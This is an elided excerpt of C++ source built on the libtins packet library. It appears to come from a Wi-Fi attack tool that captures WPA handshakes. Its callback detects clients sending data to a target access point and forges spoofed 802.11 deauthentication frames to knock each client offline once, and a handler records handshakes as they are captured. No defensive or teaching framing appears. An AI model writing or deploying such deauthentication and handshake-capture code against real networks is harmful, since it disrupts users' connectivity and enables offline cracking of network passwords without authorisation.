...
map<string, int> deauth_map; // For not sending deauth packet to one STA twice or more.
map<string, int>::iterator iter;
HWAddress<6> ap_macaddr;
NetworkInterface mon_iface;
...
private:
    ...
    void on_ap_found(const string& ssid, const address_type& bssid) {
        ap_macaddr = HWAddress<6>(bssid.to_string());
    ...
    void on_handshake_captured(const string& ssid, const address_type& bssid,
        ...
        deauth_map.insert(pair<string,int>(client_hw.to_string(), 1));
...
private:
    bool callback(PDU &pdu) {
        if ( pdu.find_pdu<Dot11>() == nullptr || (radiotap = pdu.find_pdu<RadioTap>()) == nullptr) {
            throw runtime_error("Expected an 802.11 interface in monitor mode");
        }

        if (((dot11_qos = pdu.find_pdu<Dot11QoSData>()) != nullptr))
        {

            if( memcmp(dot11_qos->addr1().begin(), ap_macaddr.begin(), 6) == 0)
            {

                iter = deauth_map.find(dot11_qos->addr2().to_string());

                if (iter == deauth_map.end()) // if the map does not contain the mac address.
                {
                  std::clog << "Deauth packet was sent to : " << dot11_qos->addr2().to_string() << std::endl;


                  deauth_pkt.addr1(dot11_qos->addr1());
                  deauth_pkt.addr2(dot11_qos->addr2());
                  deauth_pkt.addr3(dot11_qos->addr1());

                  deauth_pkt.reason_code(0x0008);

                  deauth_pkt.seq_num(dot11_qos->seq_num() + 100);

                  //tmp = radiotap->clone();

                  //tmp.version(radiotap->version());
                  //tmp.padding(radiotap->padding());
                  tmp.length(radiotap->length());
                  //tmp.tsft(radiotap->tsft());
                  //tmp.flags(radiotap->flags());
                  //tmp.rate(radiotap->rate());
                  tmp.channel(radiotap->channel_freq(), radiotap->channel_type());
                  //tmp.dbm_signal(radiotap->dbm_signal());
                  //tmp.dbm_noise(radiotap->dbm_noise());
                  //tmp.signal_quality(radiotap->signal_quality());
                  //tmp.db_signal(radiotap->db_signal());
                  //tmp.rx_flags(radiotap->rx_flags());
                  //tmp.tx_flags(radiotap->tx_flags());
                  tmp.antenna(radiotap->antenna());

                  tmp.inner_pdu(deauth_pkt);
                  sender.send(tmp, mon_iface.name());
                }
            }
        }
    ...
    // FOR SENDING DEAUTHENTICATION PACKET
    Dot11QoSData * dot11_qos;
    PacketSender sender;
    Dot11Deauthentication deauth_pkt;
    RadioTap * radiotap;
    RadioTap tmp;
...
int main(int argc, char *argv[])
{
    ...
    try {
        ...
        running = true;
        mon_iface = NetworkInterface(argv[1]);
